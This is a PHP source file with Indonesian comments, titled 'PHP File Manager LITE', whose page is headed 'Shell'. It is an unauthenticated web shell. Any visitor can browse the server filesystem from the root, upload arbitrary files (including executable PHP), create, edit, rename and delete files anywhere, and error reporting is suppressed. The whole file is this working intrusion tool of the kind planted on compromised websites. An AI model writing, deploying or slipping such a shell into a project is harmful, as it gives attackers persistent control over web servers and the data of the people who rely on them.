<?php
// PHP File Manager LITE - Versi Minimal & Fungsional

ini_set('display_errors', 0);
error_reporting(0); 

// 1. Tentukan Direktori Kerja Saat Ini (CWD)
$cwd = isset($_GET['d']) ? str_replace('..', '', $_GET['d']) : getcwd();
$cwd = realpath($cwd) ?: getcwd();
$msg = isset($_GET['msg']) ? htmlspecialchars($_GET['msg']) : '';

// --- Fungsi Pembantu (Helpers) ---

// Navigasi Direktori (Breadcrumbs)
function breadcrumbs($path) {
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $full = '';
    $out = ['<a href="?d=/">/</a>'];
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $full .= '/' . $part;
        $out[] = "<a href='?d=" . urlencode($full) . "'>$part</a>";
    }
    return implode("/", $out);
}

// Listing Isi Direktori (Dir Listing)
function list_dir($path) {
    $items = @scandir($path); 
    if ($items === false) return [];
    $dirs = $files = [];
    foreach ($items as $item) {
        if ($item === "." || $item === "..") continue;
        $full = "$path/$item";
        $info = ['name' => $item, 'path' => $full, 'is_dir' => is_dir($full), 'size' => is_file($full) ? filesize($full) : '-'];
        if ($info['is_dir']) $dirs[] = $info;
        else $files[] = $info;
    }
    usort($dirs, fn($a, $b) => strcasecmp($a['name'], $b['name']));
    usort($files, fn($a, $b) => strcasecmp($a['name'], $b['name']));
    return array_merge($dirs, $files);
}

// Format Ukuran
function formatSize($b) {
    if (!is_numeric($b)) return '-';
    $u = ['B', 'KB', 'MB', 'GB'];
    for ($i = 0; $b >= 1024 && $i < count($u) - 1; $b /= 1024, $i++);
    return round($b, 2) . ' ' . $u[$i];
}

// --- Penanganan Aksi (CRUD) ---

// 2. Aksi POST (Upload, Create, Rename)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Aksi-aksi file/folder (disederhanakan)
    if (isset($_POST['uploadfile'])) {
        $dest = $cwd . '/' . basename($_FILES['uploadfile']['name']);
        $ok = @move_uploaded_file($_FILES['uploadfile']['tmp_name'], $dest);
        $msg_text = $ok ? "UPLOAD SUCCESS: " . basename($dest) : "UPLOAD FAILED";
    } elseif (isset($_POST['newfile'])) {
        $name = trim($_POST['newfile']);
        $ok = !empty($name) ? @file_put_contents($cwd . '/' . $name, $_POST['filedata']) : false;
        $msg_text = $ok !== false ? "FILE CREATED: $name" : "FILE CREATE FAILED";
    } elseif (isset($_POST['newfolder'])) {
        $name = trim($_POST['newfolder']);
        $ok = !empty($name) ? @mkdir($cwd . '/' . $name) : false;
        $msg_text = $ok ? "FOLDER CREATED: $name" : "FOLDER CREATE FAILED";
    } elseif (isset($_POST['editfile'])) {
        $ok = @file_put_contents($_POST['filepath'], $_POST['filedata']);
        $msg_text = $ok !== false ? "FILE SAVED" : "FILE SAVE FAILED";
        $cwd = dirname($_POST['filepath']); // Ganti CWD untuk redirect yang benar
    } elseif (isset($_POST['rename'])) {
        $old = $_POST['old'];
        $new_name = basename(trim($_POST['new']));
        $ok = !empty($new_name) ? @rename($old, dirname($old) . '/' . $new_name) : false;
        $msg_text = $ok ? "RENAME SUCCESS" : "RENAME FAILED";
    }
    
    // Redirect setelah aksi POST
    header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode($msg_text));
    exit;
}

// 3. Aksi GET (Delete)
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    $ok = is_dir($target) ? @rmdir($target) : @unlink($target);
    $msg_text = $ok ? "DELETE SUCCESS" : "DELETE FAILED";
    header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode($msg_text));
    exit;
}

// 4. Halaman Edit
if (isset($_GET['edit'])) {
    $f = $_GET['edit'];
    $data = htmlspecialchars(@file_get_contents($f) ?: "ERROR: Could not read file.");
    $dir = urlencode(dirname($f));
    echo "<html><head><title>Edit</title><style>body{background:#111;color:#0f0;}textarea{background:#222;color:#0f0;width:98%;height:400px;}</style></head><body>
    [EDIT] FILE: " . basename($f) . "<br><form method='post'><textarea name='filedata'>$data</textarea><br>
    <input type='hidden' name='filepath' value='$f'><button name='editfile'>SAVE</button>
    <a href='?d=$dir'>CANCEL</a></form></body></html>";
    exit;
}

// 5. Halaman Aksi (Create File/Dir)
if (isset($_GET['action'])) {
    echo "<html><head><title>Action</title><style>body{background:#111;color:#0f0;}</style></head><body>
    <a href='?d=" . urlencode($cwd) . "'>&lt;&lt; BACK</a><br><br>";
    if ($_GET['action'] === 'create_file') {
        echo "[ACTION] CREATE NEW FILE<br><form method='post'><input name='newfile' placeholder='FILENAME'><textarea name='filedata' placeholder='CONTENT' rows='10'></textarea><button>SAVE FILE</button></form>";
    } elseif ($_GET['action'] === 'create_dir') {
        echo "[ACTION] CREATE NEW FOLDER<br><form method='post'><input name='newfolder' placeholder='FOLDER NAME'><button>CREATE FOLDER</button></form>";
    }
    echo "</body></html>";
    exit;
}


// --- Tampilan Utama (Main UI) ---

$cwd_url = urlencode($cwd);

echo "<html><head><title>Shell</title><meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
body{background:#111;color:#0f0;font-family:monospace;margin:0;padding:10px;}a{color:#0ff;text-decoration:none;}.msg{color:#fff;}.actions a{border:1px solid #0f0;padding:5px;margin-right:5px;}
table{width:100%;border-collapse:collapse;margin-top:10px;}td{border:1px dashed #333;padding:5px;}
input{background:#222;color:#0f0;border:1px solid #0f0;}
</style></head><body>";

echo "[NAV] " . breadcrumbs($cwd) . "<br><br>";
if ($msg) echo "<div class='msg'>[STATUS] $msg</div>";

// Menu Aksi
echo "<div class='actions'>
<form method='post' enctype='multipart/form-data' style='display:inline-block;'>
    <input type='file' name='uploadfile'><button name='uploadfile'>UPLOAD</button>
</form>
<a href='?d=$cwd_url&action=create_file'>+FILE</a>
<a href='?d=$cwd_url&action=create_dir'>+DIR</a>
</div>";

echo "<table><tr><td>TYPE</td><td>NAME</td><td>SIZE</td><td>ACTIONS</td></tr>";

// Daftar File dan Folder
foreach (list_dir($cwd) as $i) {
    $n = htmlspecialchars($i['name']);
    $p = $i['path'];
    $p_url = urlencode($p);
    
    if ($i['is_dir']) {
        $display_name = "[DIR] <a href='?d=$p_url'>$n</a>"; // Link untuk pindah direktori
        $edit_action = "";
    } else {
        $display_name = "[FILE] $n";
        $edit_action = "<a href='?d=$cwd_url&edit=$p_url'>[EDIT]</a>";
    }
    
    echo "<tr><td>" . ($i['is_dir'] ? 'D' : 'F') . "</td>";
    echo "<td>" . $display_name . "</td>";
    echo "<td>" . formatSize($i['size']) . "</td>";
    echo "<td>
        <a href='?d=$cwd_url&delete=$p_url' onclick='return confirm(\"DELETE $n?\")'>[DEL]</a>" .
        $edit_action .
        "<form method='post' style='display:inline-block;'>
            <input type='hidden' name='old' value='$p'>
            <input type='text' name='new' placeholder='RENAME' size='5'>
            <button name='rename'>[RN]</button>
        </form>
    </td></tr>";
}
echo "</table></body></html>";
?>
